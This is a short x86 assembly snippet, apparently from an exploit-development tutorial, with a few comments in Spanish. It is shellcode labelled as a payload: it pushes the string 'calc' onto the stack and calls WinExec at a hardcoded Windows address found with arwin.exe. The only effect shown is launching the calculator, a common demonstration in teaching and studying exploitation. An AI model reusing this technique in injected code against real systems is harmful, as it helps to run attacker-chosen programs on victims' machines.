
	section	.text

_payload:
	xor	eax,eax
	push	eax		; null byte && uCmdShow
	mov	ebx,0x636c6163	; 'calc'...
	push	ebx		; ..a la pila
	push	esp	   	; lpCmdLine = PTR 'calc.exe'
	mov	eax,0x7c8623ad	; PTR WinExec (via arwin.exe)
	call	0x7c8623ad
